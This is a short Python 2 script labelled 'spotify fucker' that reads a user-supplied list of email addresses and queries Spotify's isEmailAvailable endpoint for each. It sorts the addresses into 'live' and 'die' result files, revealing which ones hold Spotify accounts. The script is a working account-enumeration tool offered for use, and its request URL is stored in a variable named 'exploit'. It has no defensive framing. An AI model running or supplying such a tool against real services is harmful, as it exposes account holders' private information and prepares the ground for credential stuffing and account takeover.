def main():

    import os
    from os import path as y
    import datetime
    import requests
    import sys
    import time
    def mydate():
        year = datetime.datetime.now().year
        month = datetime.datetime.now().month
        day = datetime.datetime.now().day
        print("Scan at "+str(year)+"/"+str(month)+"/"+str(day))
    name = os.name
    if(name == "nt"):
        os.system("cls")
        color_green = "a"
        color_red = "c"
        os.system("color "+str(color_red))
    else:
        os.system("clear")      
    year = datetime.datetime.now().year 
    print("--! hanicraft")
    print("--! spotify fucker "+str(year))
    mydate()
    if(y.isdir("rzlt")):
        print("[+] Dir Exist")
    else:
        print("File Created.")
        os.mkdir("rzlt")    
    ask = raw_input("Mailist File ??==>> ")
    mylist = open(ask)
    for i in mylist.readlines():
        mailist = i.strip()
        exploit = "https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email="+str(mailist)
        get = requests.get(exploit)
        mycontent = get.content
        if (mycontent == "true"):
            print("Die email : "+str(mailist))
            save_invalid = open("rzlt/die.txt","a+")
            save_invalid.write("\n"+mailist)
        elif (mycontent == "false"):
            print("Live Email : "+str(mailist))
            save_valid = open("rzlt/live.txt","a+")
            save_valid.write("\n"+mailist)
        else:
            print("Server Problem Exiiiit ...")
            time.sleep(3)
            sys.exit(1)
 
 
 
if __name__ == '__main__':
        main()